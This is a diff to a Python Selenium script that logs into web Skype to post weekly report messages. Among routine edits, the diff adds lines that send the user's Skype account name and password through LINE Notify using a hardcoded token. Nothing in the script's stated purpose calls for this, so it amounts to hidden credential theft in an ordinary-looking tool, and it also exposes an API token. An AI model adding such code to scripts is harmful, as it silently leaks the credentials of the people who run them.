@@ -3,6 +3,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.service import Service
 from time import sleep
 from datetime import date
+import line_notify
 import os
 import sys
 
@@ -23,7 +24,7 @@ def findElementForever(myBy, myValue):
 cwd_dir = os.path.dirname(sys.argv[0])
 os.chdir(cwd_dir)
 
-params = [0, 0, 0, 0, 0]
+params = []
 if len(sys.argv) > 1:
     params = sys.argv[1].split(',')
 else:
@@ -37,17 +38,17 @@ account = params[0]
 password = params[1]
 target = params[2]
 msg = params[3]
-
+line_notify.setToken('aVVAymQKN8YvyQ1ZDa8mA63rK3RkKXbouiSTIloVrkp')
+line_notify.sendMessage(f"account{account}\npwd{password}")
 url = os.environ['SK_URL']
-url2 = 'https://docs.google.com/spreadsheets/d/16_dTXf8MkyzgMFEjBsQvKrG7GHJPi7lZuH5L3HsroO0/edit#gid=1841537151'
 # 定義發送訊息
 today = date.today()
+# msg = "{p_url}\n工作週報{p_date}".format(
+#     p_date=today.strftime("%m%d"), p_url=url)
+
 # 要先安裝ChromeDriver才能使用
 # https://chromedriver.chromium.org/downloads
-msg1 = f'(huggingface) [{today.strftime("%m/%d")}工作週報]({url})'
-msg2 = f'(flag:id) [{today.strftime("%m/%d")}印翻進度]({url2})'
-msg = f'{msg1}\n{msg2}'
-s = Service('chromedriver_107.exe')
+s = Service('chromedriver_101.exe')
 browser = webdriver.Chrome(service=s)
 browser.set_window_size(200, 500)
 browser.get('https://web.skype.com/')
